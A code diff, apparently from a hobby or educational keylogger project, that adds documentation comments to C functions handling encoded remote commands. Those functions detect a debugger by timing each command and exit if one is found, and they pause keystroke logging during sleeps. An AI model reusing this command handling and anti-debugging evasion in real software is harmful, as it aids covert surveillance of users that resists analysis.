@@ -18,6 +18,10 @@ static int extractN(char* cmdStr);
  * being spoofed, as such do not execute them! Furthermore, if we detect that a 
  * given command takes longer than 2.5s to execute then we are likely being debugged
  * so exit!
+ * 
+ * @param client the current client of the host machine
+ * @return whether the commands successfully executed, or we need to shutdown, or 
+ *      incorrect encoding key was detected, or a debugger was detected
  */
 RET_CODE processCommands(CLIENT_HANDLER* client) {
     char* saveState;
@@ -29,7 +33,7 @@ RET_CODE processCommands(CLIENT_HANDLER* client) {
         QueryPerformanceCounter(&start);
 
         int slp = 0;
-        RET_CODE ret = executeCommand(line, ctx->__KEY__, &slp);
+        RET_CODE ret = executeCommand(line, ctx->SECRET_KEY, &slp);
 
         QueryPerformanceCounter(&end);
         LONG elapsedTime = ((end.QuadPart - start.QuadPart) / freq.QuadPart) - slp;
@@ -49,8 +53,14 @@ RET_CODE processCommands(CLIENT_HANDLER* client) {
 }
 
 /**
- * Takes a single command, matching the given action and generating a new 
- * COMMAND struct. Then dispatches command execute before freeing the memory again
+ * Takes a single command, match the given action and execute it by 
+ * dispatching behaviour to required methods.
+ * 
+ * @param cmdStr the command to be exec'ed
+ * @param key the encoding key to use
+ * @param slp if we sleep then we need to account for that in the time-based
+ *      debugger detection! This param keeps track of it
+ * @return flag associated the commands execution
  */
 static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp) {
     encode(cmdStr, &key);
@@ -79,7 +89,10 @@ static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp) {
 
 /**
  * simply sleep for n seconds, this halts all threads because the mutex was aquired
- * before the remote commands could be executed!
+ * before the remote commands could be executed! Furthermore, the sleeping flag was 
+ * set earlier which prevents key presses fromo being logger
+ * 
+ * @param n number of milliseconds to sleep for
  */
 static void doSleep(int n) {
     printf("Sleeping for %dms\n", n);
@@ -88,7 +101,7 @@ static void doSleep(int n) {
 }
 
 /**
- * print out a you've been pwned message
+ * simply prints a 'You've been pwned!' message
  */
 static void doPawn() {
     printf("\nUnfortunately you been pwn'ed hehehe (educationally speaking :))!\n");
@@ -98,6 +111,9 @@ static void doPawn() {
 /**
  * This method will only only return a +ve int when the slp command is given, otherwise it returns 0. 
  * It will simple skip an whitespaces and then return the number if it exists
+ * 
+ * @param cmdStr the remainder of the command that was provided
+ * @return the number in the command if there was one
  */
 static int extractN(char* cmdStr) {
     while (*cmdStr != '\0' && !isdigit(*cmdStr)) { cmdStr++; }  // skip non-digit chars
